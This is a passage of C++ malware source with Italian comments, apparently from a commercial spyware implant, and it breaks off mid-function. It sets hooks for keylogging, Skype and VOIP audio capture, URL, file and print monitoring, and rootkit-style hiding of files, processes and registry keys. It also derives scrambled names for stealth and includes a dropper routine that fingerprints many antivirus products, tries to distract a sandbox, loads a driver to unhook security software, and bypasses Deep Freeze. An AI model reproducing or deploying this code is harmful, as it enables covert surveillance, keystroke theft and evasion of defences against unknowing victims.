	HMMAKE_HOOK(dwPid, "NtQueryDirectoryFile", NtQueryDirectoryFileHook, NtQueryDirectoryFileData, NtQueryDirectoryFileHook_setup, pServiceData, "NTDLL.dll");
	HMMAKE_HOOK(dwPid, "ReadDirectoryChangesW", ReadDirectoryChangesWHook, ReadDirectoryChangesWData, ReadDirectoryChangesWHook_setup, pServiceData, "KERNEL32.dll");
	HMMAKE_HOOK(dwPid, "NtQuerySystemInformation", NtQuerySystemInformationHook, NTQuerySystemInformationData, NtQuerySystemInformationHook_setup, pServiceData, "NTDLL.dll");
	HMMAKE_HOOK(dwPid, "NtDeviceIoControlFile", NtDeviceIoControlFileHook, NTDeviceIOControlFileData, NtDeviceIoControlFileHook_setup, pServiceData, "NTDLL.dll");
	HMMAKE_HOOK(dwPid, "NtEnumerateValueKey", NtEnumerateValueKeyHook, NtEnumerateValueKeyData, NtEnumerateValueKeyHook_setup, pServiceData, "NTDLL.dll");	
	HMMAKE_HOOK(dwPid, "NtQueryKey", NtQueryKeyHook, NtQueryKeyData, NtQueryKeyHook_setup, pServiceData, "NTDLL.dll");	
	
	// Metto gli Hook per tutti i PM inbundle...
	// --- PM per Url Monitor
	HMMAKE_HOOK(dwPid, "SendMessageW", PM_SendMessageURL, SendMessageURLData, PM_SendMessageURL_setup, pServiceData, "user32.dll"); 
	HMMAKE_HOOK(dwPid, "PostMessageW", PM_PostMessageURL, SendMessageURLData, PM_PostMessageURL_setup, pServiceData, "user32.dll"); 
	HMMAKE_HOOK(dwPid, "SetWindowTextW", PM_SetWindowText,  SendMessageURLData, PM_SetWindowText_setup,  pServiceData, "user32.dll"); 

	// --- PM per Snapshot (on window creation)
	HMMAKE_HOOK(dwPid, "CreateWindowExA", PM_CreateWindowEx, CreateWindowExData, PM_CreateWindowEx_setup, pServiceData, "user32.dll"); 
	HMMAKE_HOOK(dwPid, "CreateWindowExW", PM_CreateWindowEx, CreateWindowExData, PM_CreateWindowEx_setup, pServiceData, "user32.dll"); 
	//HMMAKE_HOOK(dwPid, "ShowWindow", PM_ShowWindow, ShowWindowData, PM_ShowWindow_setup, pServiceData, "user32.dll"); 

	// --- PM per VOIP
	HMMAKE_HOOK(dwPid, "WriteFile", PM_WriteFile, WriteFileData, PM_WriteFile_setup, pServiceData, "KERNEL32.dll");
	HMMAKE_HOOK(dwPid, "waveOutWrite", PM_waveOutWrite, waveOutWriteData, PM_waveOutWrite_setup, pServiceData, "WINMM.dll");
	HMMAKE_HOOK(dwPid, "waveInAddBuffer", PM_waveInUnprepareHeader, waveInUnprepareHeaderData, PM_waveInUnprepareHeader_setup, pServiceData, "WINMM.dll");
	HMMAKE_HOOK(dwPid, "SendMessageTimeoutA", PM_SendMessage, SendMessageData, PM_SendMessage_setup, pServiceData, "user32.dll"); // per SKYPE
	HMMAKE_HOOK(dwPid, "SendMessageTimeoutW", PM_SendMessage, SendMessageData, PM_SendMessage_setup, pServiceData, "user32.dll"); // per SKYPE
	HMMAKE_HOOK(dwPid, "recv", PM_Recv, RecvData, PM_Recv_setup, pServiceData, "Ws2_32.dll"); // per YahooMessenger
	HMMAKE_HOOK(dwPid, "send", PM_Send, RecvData, PM_Recv_setup, pServiceData, "Ws2_32.dll"); // per YahooMessenger
	HMMAKE_HOOK(dwPid, "WSARecv", PM_WSARecv, WSARecvData, PM_WSARecv_setup, pServiceData, "Ws2_32.dll");
	HMMAKE_HOOK(dwPid, NULL, PM_DSGetCP, DSGetCPData, PM_DSGetCP_setup, pServiceData, "dsound.dll");
	HMMAKE_HOOK(dwPid, NULL, PM_DSCapGetCP, DSCapGetCPData, PM_DSCapGetCP_setup, pServiceData, "dsound.dll");
	// Metto kernel32 giusto per far andare avanti la funzione, in realta' la dll viene caricata dal setup
	pServiceData->PARAM[0] = HMMAKE_HOOK(dwPid, NULL, PM_WASAPIGetBuffer, WASAPIGetBufferData, PM_WASAPIGetBuffer_setup, pServiceData, "kernel32.dll");
	if (pServiceData->PARAM[0]) {
		HMMAKE_HOOK(dwPid, NULL, PM_WASAPIReleaseBuffer, WASAPIReleaseBufferData, PM_WASAPIReleaseBuffer_setup, pServiceData, "kernel32.dll");
		pServiceData->PARAM[0] = NULL;
	}
	pServiceData->PARAM[0] = HMMAKE_HOOK(dwPid, NULL, PM_WASAPICaptureGetBuffer, WASAPIGetBufferData, PM_WASAPICaptureGetBuffer_setup, pServiceData, "kernel32.dll");
	if (pServiceData->PARAM[0]) {
		HMMAKE_HOOK(dwPid, NULL, PM_WASAPICaptureReleaseBuffer, WASAPIReleaseBufferData, PM_WASAPICaptureReleaseBuffer_setup, pServiceData, "kernel32.dll");
		pServiceData->PARAM[0] = NULL;
	}
	pServiceData->PARAM[0] = HMMAKE_HOOK(dwPid, NULL, PM_WASAPICaptureGetBufferMSN, WASAPIGetBufferData, PM_WASAPICaptureGetBufferMSN_setup, pServiceData, "kernel32.dll");
	if (pServiceData->PARAM[0]) {
		HMMAKE_HOOK(dwPid, NULL, PM_WASAPICaptureReleaseBufferMSN, WASAPIReleaseBufferData, PM_WASAPICaptureReleaseBufferMSN_setup, pServiceData, "kernel32.dll");
		pServiceData->PARAM[0] = NULL;
	}

	// --- PM per il file agent... XXX Le versioni Ascii richiamano comunque quelle WideChar
	// Tranne la MoveFileA, che comunque da explorer non viene mai richiamata...
	//HMMAKE_HOOK(dwPid, "CreateFileA", PM_CreateFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
	//HMMAKE_HOOK(dwPid, "DeleteFileA", PM_DeleteFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
	//HMMAKE_HOOK(dwPid, "MoveFileA", PM_MoveFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");

	HMMAKE_HOOK(dwPid, "CreateFileW", PM_CreateFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
	HMMAKE_HOOK(dwPid, "DeleteFileW", PM_DeleteFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
	HMMAKE_HOOK(dwPid, "MoveFileW", PM_MoveFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");

	// --- PM per il keylog agent
	HMMAKE_HOOK(dwPid, "GetMessageA", PM_GetMessage, GetMessageData, PM_GetMessage_setup, pServiceData, "user32.dll");
	HMMAKE_HOOK(dwPid, "GetMessageW", PM_GetMessage, GetMessageData, PM_GetMessage_setup, pServiceData, "user32.dll");
	HMMAKE_HOOK(dwPid, "PeekMessageA", PM_PeekMessage, GetMessageData, PM_GetMessage_setup, pServiceData, "user32.dll");
	HMMAKE_HOOK(dwPid, "PeekMessageW", PM_PeekMessage, GetMessageData, PM_GetMessage_setup, pServiceData, "user32.dll");
	HMMAKE_HOOK(dwPid, "ImmGetCompositionStringW", PM_ImmGetCompositionString, GetMessageData, PM_GetMessage_setup, pServiceData, "imm32.dll");
	HMMAKE_HOOK(dwPid, "ReadConsoleInputA", PM_ReadConsoleInput, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
	HMMAKE_HOOK(dwPid, "ReadConsoleInputW", PM_ReadConsoleInput, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
	HMMAKE_HOOK(dwPid, "ReadConsoleA", PM_ReadConsoleA, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
	HMMAKE_HOOK(dwPid, "ReadConsoleW", PM_ReadConsoleW, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
	HMMAKE_HOOK(dwPid, "ReadConsoleInputExA", PM_ReadConsoleInputEx, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
	HMMAKE_HOOK(dwPid, "ReadConsoleInputExW", PM_ReadConsoleInputEx, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");

	// --- PM per il print agent...
	// Le altre funzioni utilizzeranno PARAM[0] per accedere ai dati memorizzati nella
	// DataStruct di CreateDC (es: handle al memory device)
	pServiceData->PARAM[0] = HMMAKE_HOOK(dwPid, "CreateDCW", CreateDC_wrap, CreateDC_data, CreateDC_setup, pServiceData, "GDI32.dll");
	
	// Se ha creato correttamente il primo hook, inserisce tutti gli altri
	// Altrimenti scorrerebbero non avendo il puntatore alla struttura dati 
	// di CreateDC
	if (pServiceData->PARAM[0]) {
		HMMAKE_HOOK(dwPid, "CreateDCA", CreateDCA_wrap, CreateDCA_data, CreateDCA_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "DeleteDC", DeleteDC_wrap, DeleteDC_data, DeleteDC_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "StartDocW", StartDoc_wrapW, StartDoc_data, StartDoc_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "StartDocA", StartDoc_wrapA, StartDoc_data, StartDoc_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "StartPage", StartPage_wrap, StartPage_data, StartPage_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "EndPage", EndPage_wrap, EndPage_data, EndPage_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "EndDoc", EndDoc_wrap, EndDoc_data, EndDoc_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "SetAbortProc", SetAbortProc_wrap, SetAbortProc_data, SetAbortProc_setup, pServiceData, "GDI32.dll");
		HMMAKE_HOOK(dwPid, "GetDeviceCaps", GetDeviceCaps_wrap, GetDeviceCaps_data, GetDeviceCaps_setup, pServiceData, "GDI32.dll");
	}
}


void __stdcall HM_sInBundleService(DWORD dwPid, HMServiceStruct *pServiceData)
{
	HMMAKE_HOOK(dwPid, NULL, IPCClientRead, IPCClientRead_data, IPCClientRead_setup, NULL, NULL);
	HMMAKE_HOOK(dwPid, NULL, IPCClientWrite, IPCClientWrite_data, IPCClientWrite_setup, NULL, NULL);
	pServiceData->pHM_IpcCliRead = (HM_IPCClientRead_t) IPCClientRead_data.dwHookAdd;	
	pServiceData->pHM_IpcCliWrite = (HM_IPCClientWrite_t) IPCClientWrite_data.dwHookAdd;
}

////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
// 
//								EXPORTS SECTION: END 
//
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////


////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
// 
//								STARTUP PROCUDERE: START
//
////////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
//
//    Funzioni di supporto
//

// Converte Unicode in ascii
void HM_U2A(char *buffer)
{
	DWORD i=0, j=0;
	if (!buffer || buffer[1]!=0)
		return;

	do {
		i++;
		j+=2;
		buffer[i]=buffer[j];
	} while(buffer[i]!=0);
}

void HM_A2U(char *src, char *dst)
{
	DWORD i=0;
	do {
		dst[i*2] = src[i];
		dst[i*2+1] = 0;
	} while(src[i++]);
}



// Prende un path in unicode e torna una stringa dos sicuramente valida in 
// ascii per accedere al file
char *GetDosAsciiName(WCHAR *orig_path)
{
	char *dest_a_path;
	WCHAR dest_w_path[_MAX_PATH + 2];
	DWORD mblen;

	memset(dest_w_path, 0, sizeof(dest_w_path));
	if (!FNC(GetShortPathNameW)(orig_path, dest_w_path, (sizeof(dest_w_path) / sizeof (WCHAR))-1))
		return NULL;

	if ( (mblen = FNC(WideCharToMultiByte)(CP_ACP, 0, dest_w_path, -1, NULL, 0, NULL, NULL)) == 0 )
		return NULL;

	if ( !(dest_a_path = (char *)malloc(mblen)) )
		return NULL;

	if ( FNC(WideCharToMultiByte)(CP_ACP, 0, dest_w_path, -1, (LPSTR)dest_a_path, mblen, NULL, NULL) == 0 ) {
		free(dest_a_path);
		return NULL;
	}

	return dest_a_path;
}

// Espande le variabili d'ambiente e il tag della home
// dsize e' il numero di WCHAR contenibili in dest
BOOL HM_ExpandStringsW(WCHAR *source, WCHAR *dest, DWORD dsize)
{
	WCHAR *ptr;
	WCHAR *tmp_buf;

	if (!FNC(ExpandEnvironmentStringsW)(source, dest, dsize)) 
		return FALSE;

	if ( !(tmp_buf = (WCHAR *)malloc(dsize*sizeof(WCHAR))) )
		return FALSE;

	// Espande la variabile d'ambiente fittizia della home
	while ( (ptr = wcsstr(dest, HOME_VAR_NAME_W)) ) {
		*ptr = 0;
		ptr += wcslen(HOME_VAR_NAME_W);
		if (_snwprintf_s(tmp_buf, dsize, _TRUNCATE, L"%s%S%s", dest, H4_HOME_PATH, ptr) == -1 ||
			_snwprintf_s(dest, dsize, _TRUNCATE, L"%s", tmp_buf) == -1) {
			free(tmp_buf);
			return FALSE;
		}
	}
	free(tmp_buf);
	return TRUE;
}

// Espande le variabili d'ambiente e il tag della home
BOOL HM_ExpandStrings(char *source, char *dest, DWORD dsize)
{
	char *ptr;
	char *tmp_buf;

	if (!FNC(ExpandEnvironmentStringsA)(source, dest, dsize)) 
		return FALSE;

	if ( !(tmp_buf = (char *)malloc(dsize)) )
		return FALSE;

	// Espande la variabile d'ambiente fittizia della home
	while ( (ptr = strstr(dest, HOME_VAR_NAME)) ) {
		*ptr = 0;
		ptr += strlen(HOME_VAR_NAME);
		if (_snprintf_s(tmp_buf, dsize, _TRUNCATE, "%s%s%s", dest, H4_HOME_PATH, ptr) == -1 ||
			_snprintf_s(dest, dsize, _TRUNCATE, "%s", tmp_buf) == -1) {
			free(tmp_buf);
			return FALSE;
		}
	}
	free(tmp_buf);
	return TRUE;
}

BOOL GetUserUniqueHash(BYTE *user_hash, DWORD hash_size)
{
	HANDLE hToken=0;
	TOKEN_USER *token_owner=NULL;
	DWORD dwLen=0;
	char *string_sid;
	BOOL ret_val = FALSE;

	if (!user_hash)
		return FALSE;
	memset(user_hash, 0, hash_size);
	if (hash_size < SHA_DIGEST_LENGTH)
		return FALSE;

	if( FNC(OpenProcessToken)(FNC(GetCurrentProcess)(), TOKEN_QUERY| TOKEN_QUERY_SOURCE, &hToken) ) {
		FNC(GetTokenInformation)(hToken, TokenUser, token_owner, 0, &dwLen);
		if (dwLen)
			token_owner = (TOKEN_USER *) malloc( dwLen );
		if(token_owner) {
			memset(token_owner, 0, dwLen);
			if( FNC(GetTokenInformation)(hToken, TokenUser, token_owner, dwLen, &dwLen) &&
				FNC(ConvertSidToStringSidA)(token_owner->User.Sid, &string_sid) ) {
				
				SHA1Context sha;
				SHA1Reset(&sha);
				SHA1Input(&sha, (const unsigned char *)string_sid, (DWORD)(strlen(string_sid)));
				if (SHA1Result(&sha)) {
					for (int i=0; i<5; i++)
						sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
					memcpy(user_hash, sha.Message_Digest, SHA_DIGEST_LENGTH);
					ret_val = TRUE;
				}
				LocalFree(string_sid);
			}
			free(token_owner);
		}
		CloseHandle(hToken);
	}
	return ret_val;
}

// Ritorna il nome del processo "pid"
// Torna NULL se non ha trovato niente 
// N.B. Se torna una stringa, va liberata
char *HM_FindProc(DWORD pid)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD dwPID = 0;
	char *name_offs;
	char *ret_name = NULL;

	pe32.dwSize = sizeof( PROCESSENTRY32 );
	if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE )
		return NULL;

	if( !FNC(Process32First)( hProcessSnap, &pe32 ) ) {
		CloseHandle( hProcessSnap );
		return NULL;
	}

	// Cicla la lista dei processi attivi
	do {
		// Cerca il processo "pid"
		if (pe32.th32ProcessID == pid) {
			// Elimina il path
			name_offs = strrchr(pe32.szExeFile, '\\');
			if (!name_offs)
				name_offs = pe32.szExeFile;
			else
				name_offs++;
			ret_name = _strdup(name_offs);
			break;
		}
	} while( FNC(Process32Next)( hProcessSnap, &pe32 ) );

	CloseHandle( hProcessSnap );
	return ret_name;
}

// Ritorna il nome del processo "pid"
// Torna NULL se non ha trovato niente 
// N.B. Se torna una stringa, va liberata
WCHAR *HM_FindProcW(DWORD pid)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32W pe32;
	DWORD dwPID = 0;
	WCHAR *name_offs;
	WCHAR *ret_name = NULL;

	pe32.dwSize = sizeof(pe32);
	if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE )
		return NULL;

	if( !FNC(Process32FirstW)( hProcessSnap, &pe32 ) ) {
		CloseHandle( hProcessSnap );
		return NULL;
	}

	// Cicla la lista dei processi attivi
	do {
		// Cerca il processo "pid"
		if (pe32.th32ProcessID == pid) {
			// Elimina il path
			name_offs = wcsrchr(pe32.szExeFile, L'\\');
			if (!name_offs)
				name_offs = pe32.szExeFile;
			else
				name_offs++;
			ret_name = _wcsdup(name_offs);
			break;
		}
	} while( FNC(Process32NextW)( hProcessSnap, &pe32 ) );

	CloseHandle( hProcessSnap );
	return ret_name;
}


// Torna TRUE se il processo e' dell'utente
// chiamante
BOOL IsMyProcess(DWORD pid)
{
	HANDLE hProc=0;
	HANDLE hToken=0;
	TOKEN_USER *token_owner=NULL;
	char wsRefDomain[512], wsUserName[512], wsEffectiveName[512];
	SID_NAME_USE peUse;
	BOOL ret_val = FALSE;
	DWORD dwLen=0, cbUserName = sizeof(wsUserName), cbRefDomain = sizeof(wsRefDomain), cbEffectiveName = sizeof(wsEffectiveName);

	hProc = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION, FALSE, pid);

	if (hProc) {
		if( FNC(OpenProcessToken)(hProc, TOKEN_QUERY| TOKEN_QUERY_SOURCE, &hToken) ) {
			FNC(GetTokenInformation)(hToken, TokenUser, token_owner, 0, &dwLen);
			if (dwLen)
				token_owner = (TOKEN_USER *) malloc( dwLen );
			if(token_owner) {
				memset(token_owner, 0, dwLen);
				if( FNC(GetTokenInformation)(hToken, TokenUser, token_owner, dwLen, &dwLen) )
					if (FNC(LookupAccountSidA)(NULL, token_owner->User.Sid, wsUserName, &cbUserName, wsRefDomain, &cbRefDomain, &peUse)) 
						if (FNC(GetUserNameA)(wsEffectiveName, &cbEffectiveName))
							if (!_stricmp(wsEffectiveName, wsUserName))
								ret_val = TRUE;
				free(token_owner);
			}
			CloseHandle(hToken);
		}
		CloseHandle(hProc);
	}

	return ret_val;
}

// Ritorna il PID del processo "proc_name"
// Torna 0 se non lo trova
// Se my_flag e' settato, torna solo i processi
// dell'utente chiamante
DWORD HM_FindPid(char *proc_name, BOOL my_flag)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD dwPID = 0;
	char *name_offs;

	pe32.dwSize = sizeof( PROCESSENTRY32 );
	if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE )
		return 0;

	if( !FNC(Process32First)( hProcessSnap, &pe32 ) ) {
		CloseHandle( hProcessSnap );
		return 0;
	}

	// Cicla la lista dei processi attivi
	do {
		// Elimina il path
		name_offs = strrchr(pe32.szExeFile, '\\');
		if (!name_offs)
			name_offs = pe32.szExeFile;
		else
			name_offs++;

		// Cerca il processo confrontando il nome
		if (!_stricmp(name_offs, proc_name)) {
			if (!my_flag || IsMyProcess(pe32.th32ProcessID)) {
				dwPID = pe32.th32ProcessID;
				break;
			}
		}
	} while( FNC(Process32Next)( hProcessSnap, &pe32 ) );

	CloseHandle( hProcessSnap );
	return dwPID;
}


#define MAX_CMD_LINE 800
typedef BOOL (WINAPI *CreateProcess_t) (LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *CloseHandle_t) (HANDLE);
typedef struct {
	COMMONDATA;
	CreateProcess_t pCreateProcess;
	CloseHandle_t pCloseHandle;
	char cmd_line[MAX_CMD_LINE];
	DWORD flags;
	STARTUPINFO si;
    PROCESS_INFORMATION pi;
} HMCreateProcessThreadDataStruct;

// Thread iniettato dentro explorer per effettuare CreateProcess
DWORD HM_CreateProcessThread(void *dummy)
{
	INIT_WRAPPER(HMCreateProcessThreadDataStruct);

	if (!pData->pCreateProcess(NULL, pData->cmd_line, 0, 0, FALSE, pData->flags, 0, 0, &(pData->si), &(pData->pi))) {
		pData->pi.dwProcessId = 0;
		return 0;
	}

	// Chiude gli handle aperti dentro explorer
	pData->pCloseHandle(pData->pi.hProcess);
	pData->pCloseHandle(pData->pi.hThread);
	return 1;
}

//Riempie i campi relativi al nome del file immagine,
//file di configurazione, directory di installazione.
//Se torna FALSE non chiude niente, tanto il processo
//poi uscira'.
BOOL HM_GuessNames()
{
	char path_name[DLLNAMELEN+1];
	char neutral_name[MAX_RAND_NAME];
	char *ptr_offset;
	
	if (!FindModulePath(path_name, sizeof(path_name)))
		return FALSE;

	// Comincia la scomposizione del path
	// Ci assicuriamo la NULL terminazione

	// Nome DLL
	if (! (ptr_offset = FNC(StrRChrA)(path_name, NULL, '\\')) )
		return FALSE;
	_snprintf_s(H4DLLNAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset+1);
	*ptr_offset = 0;

	// Path della home
	_snprintf_s(H4_HOME_PATH, DLLNAMELEN, _TRUNCATE, "%s", path_name);

	// Nome directory home
	if (! (ptr_offset = FNC(StrRChrA)(path_name, NULL, '\\')) )
		return FALSE;
	_snprintf_s(H4_HOME_DIR, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset+1);

	// Deriva il nome dell'altro file che puo' essere usato per l'update
	// (Uso Alphabetlen/2 per avere sempre gli stessi due nomi che ciclano)
	if ( !(ptr_offset = LOG_ScrambleName(H4DLLNAME, ALPHABET_LEN/2, TRUE)) )
		return FALSE;
	_snprintf_s(H4_UPDATE_FILE, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	// Fra i due nomi possibili sceglie quello piu' piccolo in ordine alfabetico
	// da cui derivare i nomi rimanenti (in modo che qualsiasi dei due file
	// fra attuale e update sia utilizzato, i nomi dei file di conf, codec, etc.
	// siano gli stessi).
	if (H4_UPDATE_FILE[0]<H4DLLNAME[0])
		_snprintf_s(neutral_name, MAX_RAND_NAME, _TRUNCATE, "%s", H4_UPDATE_FILE);
	else
		_snprintf_s(neutral_name, MAX_RAND_NAME, _TRUNCATE, "%s", H4DLLNAME);

	// Il file di configurazione lo derivo dal nome "neutrale" della DLL
	// (quello fra i due dell'update piu' piccolo in ordine alfabetico).
	if ( !(ptr_offset = LOG_ScrambleName(neutral_name, 1, TRUE)) )
		return FALSE;
	_snprintf_s(H4_CONF_FILE, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);
	
	// Il conf back-up lo derivo dal file di conf
	if ( !(ptr_offset = LOG_ScrambleName(H4_CONF_FILE, 1, TRUE)) )
		return FALSE;
	_snprintf_s(H4_CONF_BU, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	// Il nome del codec lo derivo dal file di backup
	if ( !(ptr_offset = LOG_ScrambleName(H4_CONF_BU, 1, TRUE)) )
		return FALSE;
	_snprintf_s(H4_CODEC_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	// Il nome del file dummy lo derivo dal file del codec
	if ( !(ptr_offset = LOG_ScrambleName(H4_CODEC_NAME, 1, TRUE)) )
		return FALSE;
	_snprintf_s(H4_DUMMY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	// XXX Attenzione che dopo dummy_name c'e' il nome del driver di
	// kaspersky, della pstorec.dll e del file di capture per la webcam
	
	if ( !(ptr_offset = LOG_ScrambleName(H4_DUMMY_NAME, 10, TRUE)) )
		return FALSE;
	_snprintf_s(H4_MOBCORE_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	if ( !(ptr_offset = LOG_ScrambleName(H4_MOBCORE_NAME, 1, TRUE)) )
		return FALSE;
	_snprintf_s(H4_MOBZOO_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	// CONF SCRAMBLATO DI 15
	if ( !(ptr_offset = LOG_ScrambleName(H4_MOBZOO_NAME, 1, TRUE)) )
		return FALSE;
	_snprintf_s(H64DLL_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	// Se e' 32bit prende il driver classico (dummy scramblato di 1)
	// altrimenti prende quello nuovo (conf scramblato di 16)
	if (IsX64System()) {
		if ( !(ptr_offset = LOG_ScrambleName(H64DLL_NAME, 1, TRUE)) )
			return FALSE;
		_snprintf_s(H4DRIVER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
		SAFE_FREE(ptr_offset);
	} else {
		if ( !(ptr_offset = LOG_ScrambleName(H4_DUMMY_NAME, 1, TRUE)) )
			return FALSE;
		_snprintf_s(H4DRIVER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
		SAFE_FREE(ptr_offset);
	}

	// XXX Attenzione che i successivi li devo derivare da H4_MOBZOO_NAME scramblato di 2

	// La chiave nel registry la deriva dalla directory
	if ( !(ptr_offset = LOG_ScrambleName(H4_HOME_DIR, 1, TRUE)) )
		return FALSE;
	ptr_offset[0] = '*'; // Aggiunge l'* per il SAFE MODE
	_snprintf_s(REGISTRY_KEY_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
	SAFE_FREE(ptr_offset);

	// L'exe per l'infezione USB lo deriva dalla directory (non ha bisogno di estensione, inutile incasinare ancora l'altra linea)
	if ( !(ptr_offset = LOG_ScrambleName(H4_HOME_DIR, 2, TRUE)) )
		return FALSE;
	_snprintf_s(EXE_INSTALLER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);

	// Genera i nomi della shared memory in base alla chiave per-cliente
	// XXX Verificare sempre che la chiave NON sia quella embeddata nel codice, maquella binary-patched
	BYTE *temp_arr = (BYTE *)CLIENT_KEY;
	BYTE ckey_arr[16];
	for (int j=0; j<16; j++)
		ckey_arr[j] = temp_arr[j];
	_snprintf_s(SHARE_MEMORY_READ_NAME, MAX_RAND_NAME, _TRUNCATE, "%s%02X%02X%02X%02X", SHARE_MEMORY_READ_BASENAME, ckey_arr[0], ckey_arr[1], ckey_arr[2], ckey_arr[3]);
	_snprintf_s(SHARE_MEMORY_WRITE_NAME, MAX_RAND_NAME, _TRUNCATE, "%s%02X%02X%02X%02X", SHARE_MEMORY_WRITE_BASENAME, ckey_arr[0], ckey_arr[1], ckey_arr[2], ckey_arr[3]);
	_snprintf_s(SHARE_MEMORY_ASP_COMMAND_NAME, MAX_RAND_NAME, _TRUNCATE, "%s%02X%02X%02X%02X", SHARE_MEMORY_ASP_COMMAND_BASENAME, ckey_arr[0], ckey_arr[1], ckey_arr[2], ckey_arr[3]);

	return TRUE;
}


void IndirectCreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi)
{
	HMODULE hmod = NULL;
	CreateProcess_t pCreateProcess = NULL;

	hmod = GetModuleHandle("kernel32.dll");
	if (hmod)
		pCreateProcess = (CreateProcess_t)HM_SafeGetProcAddress(hmod, "CreateProcessA");
	if (pCreateProcess)
		pCreateProcess(NULL, cmd_line, 0, 0, FALSE, flags, 0, 0, si, pi);
}

// Funzione richiamata dal dropper che sceglie il processo da usare per fare la 
// CreateProcess e poi la invoca.
extern "C" void __stdcall HIDING(void);
void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi)
{
	DWORD dummy;

	// Cerca di "distrarre" la sandbox di kaspersky
	HIDING();

	// Decide se e dove copiare il driver 
	// (Se c'e' ZoneAlarm E ctfmon NON mette il driver)
	if ( (IsVista(&dummy) || IsAvira() || IsDeepFreeze() || IsBlink() || IsPGuard() || /*IsKaspersky() ||*/ IsMcAfee() || IsKerio() || IsComodo2() || IsComodo3() || IsPanda() || IsTrend() || IsZoneAlarm() || IsAshampoo() || IsEndPoint())
		 && !(IsZoneAlarm() && HM_FindPid("ctfmon.exe", TRUE)) && !IsRising() && !IsADAware() && !IsSunBeltPF() && (!IsPCTools() || IsDeepFreeze()) && (!IsKaspersky() || IsDeepFreeze())) {
		WCHAR drv_path[DLLNAMELEN*2];

		if (!HM_GuessNames()) {
			ReportCannotInstall();
			return;
		}

		// Copia il driver
		if (!CopySystemDriver(drv_path)) {
			ReportCannotInstall();
			return;
		}

		HideDevice dev_unhook(drv_path);
		Sleep(350); // XXX Attesa paranoica
		if (!IsAvast())
			dev_unhook.unhook_all(FALSE);
		dev_unhook.unhook_func("ZwSetValueKey", TRUE);
		dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), TRUE);
		if ((IsAvira() || IsBlink() || /*IsKaspersky() ||*/ IsKerio() || IsPGuard() || IsComodo2() || IsComodo3() || IsPanda() || IsTrend() || IsEndPoint()) && (!dev_unhook.unhook_isdrv(DRIVER_NAME_W) && !dev_unhook.unhook_isdrv(DRIVER_NAME_OLD_W))) {
			ReportCannotInstall();
			return;
		}

		// Se c'e' deep freeze copia il core e il driver sul disco "reale"
		if (IsDeepFreeze()) {
			if (DFFixCore(&dev_unhook, (unsigned char *)H4DLLNAME, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME)) {
				PVOID old_value = DisableWow64Fs();
				DFFixDriver(&dev_unhook, drv_path);
